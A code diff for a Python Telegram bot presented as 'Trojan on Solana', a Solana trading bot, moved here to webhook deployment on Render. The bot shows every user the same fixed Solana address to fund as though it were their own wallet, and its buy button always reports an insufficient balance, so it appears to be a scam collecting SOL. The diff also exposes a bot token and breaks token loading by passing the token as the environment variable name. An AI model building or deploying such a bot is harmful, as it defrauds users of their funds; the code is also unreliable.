@@ -1,3 +1,4 @@
+import os
 import logging
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
@@ -7,7 +8,7 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 logger = logging.getLogger(__name__)
 
 # Define the admin Telegram user ID
-ADMIN_ID = 5698476270  # Replace with your Telegram user ID
+ADMIN_ID = int(os.getenv("ADMIN_ID", "5698476270"))  # Replace with your Telegram user ID or set via Render
 
 # Define the main menu keyboard
 def main_menu_keyboard():
@@ -49,13 +50,10 @@ def admin_page_keyboard():
 
 # Function to handle the /start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.message.from_user.id
     welcome_message = (
         f"Welcome to Trojan on Solana, {update.message.from_user.first_name}!\n\n"
         "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
         "Trade any token instantly right after launch.\n\n"
-        "Here's your Solana wallet address linked to your Telegram account. "
-        "Simply fund your wallet and dive into trading.\n\n"
         "Solana Address:\n\n"
         "CTbFNi9v996i1Xbrg2QRXjJhXvLPiZAhqaG3HNkMfgat\n"
         "(tap to copy)\n\n"
@@ -82,7 +80,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     elif query.data == "back_to_main":
         await query.edit_message_text("Returning to main menu...", reply_markup=main_menu_keyboard())
 
-    # Handle other buttons (buy, sell, etc.)
     elif query.data == "buy":
         await query.edit_message_text(
             "Buy $SLND- (Solend) 📈\n\nBalance: -_- SOL\nInsufficient balance for buy amount + gas.",
@@ -106,9 +103,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     else:
         await query.edit_message_text("Feature not implemented yet.", reply_markup=main_menu_keyboard())
 
-# Function to set up polling
+# Function to set up polling or webhook
 def run_bot():
-    TOKEN = "7761108718:AAFmR_1ZtMAXX8DBi_r3BCo7418MtK6C1GU"  # Replace with your bot token
+    TOKEN = os.getenv("7761108718:AAFmR_1ZtMAXX8DBi_r3BCo7418MtK6C1GU")  # Fetch the bot token from environment variables
+    PORT = int(os.getenv("PORT", 8443))  # Render automatically sets this port
+    HOSTNAME = os.getenv("RENDER_EXTERNAL_HOSTNAME")  # Render provides this for webhook configuration
 
     # Set up the application
     application = Application.builder().token(TOKEN).build()
@@ -117,8 +116,13 @@ def run_bot():
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CallbackQueryHandler(button_handler))
 
-    # Start polling
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    # Start the bot using webhook
+    application.run_webhook(
+        listen="0.0.0.0",
+        port=PORT,
+        url_path=TOKEN,
+        webhook_url=f"https://{HOSTNAME}/{TOKEN}"
+    )
 
 # Entry point of the script
 if __name__ == "__main__":
